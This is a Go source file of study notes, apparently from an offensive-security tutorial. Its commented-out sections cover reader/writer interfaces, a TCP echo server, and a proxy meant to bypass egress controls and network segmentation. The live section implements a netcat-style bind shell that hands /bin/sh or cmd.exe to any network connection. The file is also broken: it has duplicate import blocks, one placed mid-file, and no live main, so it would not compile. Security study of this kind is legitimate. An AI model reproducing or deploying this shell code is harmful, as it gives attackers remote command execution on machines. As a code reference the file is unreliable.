package main

import (
	"bufio"
	"io"
	"net"
	"os/exec"
)

//import (
//    "fmt"
//    "log"
//    "os"
//    "io"
//)
//
//// Cornestone types for any data transmission, local or networked.
//type Reader interface {
//    Read (p []byte) (n int, err error)
//}
//
//type Writer interface {
//    Write(p []byte)(n int, err error)
//}
//
//// First we define two custom types: FooReader and FooWriter
//// Each type has a concrete implementation that implicitly
//// derives them from the previously two interfaces.
//
//type FooReader struct {}
//
//// Reads data from stdin to bit array b.
//func (fooReader* FooReader) Read(b []byte) (int, error) {
//    fmt.Print("in> ")
//    return os.Stdin.Read(b)
//}
//
//type FooWriter struct {}
//
//// Write contents from a byte array to standard output.
//func (fooWriter* FooWriter) Write(b []byte) (int, error) {
//    fmt.Print("out>")
//    return os.Stdout.Write(b);
//}
//
//func main() {
//    var (
//        reader FooReader
//        writer FooWriter
//    )
//
//    // Create buffer to hold input/output
//    //input := make([]byte, 4096)
//    // // Use reader to read input
//    // s, err := reader.Read(input)
//    // if err != nil {
//    //     log.Fatalln("Unable to read data")
//    // }
//    // fmt.Printf("Read %d bytes from stdin\n", s)
//
//    // // Use writer to write output.
//    // s, err = writer.Write(input)
//    // if err != nil {
//    //     log.Fatalln("Unable to write data")
//    // }
//    // fmt.Printf("Wrote %d bytes to stdout\n", s)
//
//    // Copying data from a reader to a writer is a common pattern.
//    // Use Go's Copy() function instead.
//    // This function receives a Writter and a Reader types.
//    // Underneath, our FooRead and FooWrite read and write methods will
//    // be executed.
//    if _, err := io.Copy(&writer, &reader); err != nil {
//        log.Fatalln("Unable to read/wirte data")
//    }
//}

// Creating the echo server

// net.Conn
//  - Go's stream oriented network connection.
//  - Conn is both a reader and a writer.
//  - TCP connections are bidirectional.
// net.Listen(network, address string)
//  - Go's way to open a TCP listener on a specific port.
// Listener.Accept()
//  - Will return a Conn object instance.
//  - This Conn can be used to send and receive data.

//import (
//    "log"
//    "net"
//    "io"
//    "bufio"
//)
//
//// Echo is a handler function that simply echoes received data.
//func echo(conn net.Conn) {
//    defer conn.Close()
//    // Create a buffer to store received data.
//    //b := make([]byte, 512)
//
//    //for { // infinite loop
//    //    // Receive data via conn.Read into buffer.
//    //    size, err := conn.Read(b[0:])
//    //    if err == io.EOF {
//    //        log.Println("Client disconnected")
//    //        break
//    //    }
//    //    if err != nil {
//    //        log.Println("Unexpected error")
//    //        break
//    //    }
//    //    log.Printf("Received %d bytes: %s\n", size, string(b))
//
//    //    // Send data via conn.Write.
//    //    log.Println("Writing data")
//    //    if _, err := conn.Write(b[0:size]); err != nil {
//    //        log.Fatalln("Unable to write data")
//    //    }
//    //}
//
//    // Bufio is a high level wrapper that avoids
//    // directly writing and reading from a buffer.
//    // Implements a buffered reader
//    //reader := bufio.NewReader(conn)
//    //s, err := reader.ReadString('\n')
//    //if err != nil {
//    //    log.Fatalln("Unable to read data")
//    //}
//    //log.Printf("Read %d bytes: %s", len(s), s)
//
//    //// When writing data you need to explicitly call
//    //// writer.Flush to flush the data to the underlying
//    //// writer.
//    //log.Println("Writing data")
//    //writer := bufio.NewWriter(conn)
//    //if _, err := writer.WriteString(s); err != nil {
//    //    log.Fatalln("Unable to write data")
//    //}
//    //writer.Flush()
//
//    // We can also use Copy(Writer, Reader)
//    if _, err := io.Copy(conn, conn); err!= nil {
//        log.Fatalln("Unable to reader/write data")
//    }
//}
//
//func main() {
//    // Bind to TCP port 20080 on all interfaces
//    listener, err := net.Listen("tcp", ":20080")
//    if err != nil {
//        log.Fatalln("Unable to bind to port")
//    }
//    log.Println("Listening on 0.0.0.0:20080")
//    for {
//        // wait for a connection.
//        // Create an instance of net.Conn when established.
//        conn, err := listener.Accept()
//        log.Println("Received connection")
//        if err != nil {
//            log.Fatalln("Unable to accept connnection")
//        }
//        // Handle the connection.
//        // Use a goroutine for concurrency.
//        go echo(conn)
//    }
//}

// Proxying a TCP client.
// - Circunvent restrictive egress controls.
// - Leverage a system to bypass network segmentation.

//import (
//    "log"
//    "io"
//)
//
//func handle(src net.Conn) {
//    dst, err := net.Dial("tcp", "joescatcam.website:80")
//    if err != nil {
//        log.Fatalln("Unable to connect to our unreachable host")
//    }
//    defer dst.Close()
//    // Run in goroutine to prevent io.Copy from blocking.
//    go func() {
//        // [Src] ---> [Dest]
//        // Copy our source's output to the destination
//        if _,err := io.Copy(dst, src); err != nil {
//            log.Fatalln(err)
//        }
//    }()
//    // [Src] <--- [Dest]
//    // Copy our destination's output back to our source
//    if _,err := io.Copy(src, dst); err != nil {
//        log.Fatalln(err)
//    }
//}
//
//func main() {
//    // Listen on local port 80
//    listener, err := net.Listen("tcp", ":80")
//    if err != nil {
//        log.Fatalln("Unable to bind to port")
//    }
//    for {
//        conn, err := listener.Accept()
//        if err != nil {
//            log.Fatalln("Unable to accept connection")
//        }
//        go handle(conn)
//    }
//}

/// GAPING SECURITY implementation in Go

import (
    "bufio"
    "os/exec"
    "runtime"
    "log"
)

// Wrap bufio-Writer to explicitly flush all writes.
type Flusher struct {
    w *bufio.Writer
}


// NewFlusher creates a new Flusher from an io.Writer
func NewFlusher(w io.Writer) *Flusher {
    return &Flusher {
        w: bufio.NewWriter(w),
    }
}

// Write writes bytes and explicitly flushes buffer.
func (foo *Flusher) Write(b []byte) (int, error) {
    count, err := foo.w.Write(b)
    if err != nil {
        return -1, err
    }
    if err := foo.w.Flush(); err != nil {
        return -1, err
    }
    return count, err
}

func executeShell() *exec.Cmd {
    if runtime.GOOS == "windows" {
        return exec.Command("cmd.exe", "-i")
    }
    return exec.Command("/bin/sh", "-i")
}


func handle(conn net.Conn) {
    // Explicitly calling /bin/sh and using -i for interactive mode
    // so taht we can use it for stdin and stdout.
    // For Windows use exec.Command("cmd.exe").

//    cmd := executeShell()
//    // set stdin to our connection
    //    cmd.Stdin = conn
//
//    // Create a Flusher from the connection to use for stdout.
//    // This ensures stdout is flushed adequately and sent via
//    // net.Conn.
//    cmd.Stdout = NewFlusher(conn)
//
//    // Run the command
//    if err := cmd.Run(); err != nil {
//        log.Fatalln(err)
//    }

    // We can also use the Go synchronous in-memory pipe.
    cmd := executeShell()
    rp, wp := io.Pipe()
    // Receive the data from the connection.
    cmd.Stdin = conn
    // Assign the pipe writer to stdout.
    cmd.Stdout = wp
    // Use a coroutine in order to avoid blocking.
    // Link the pipereader to the TCP connection.
    // src --> dst
    go io.Copy(conn, rp)
    cmd.Run()
    conn.Close()
}
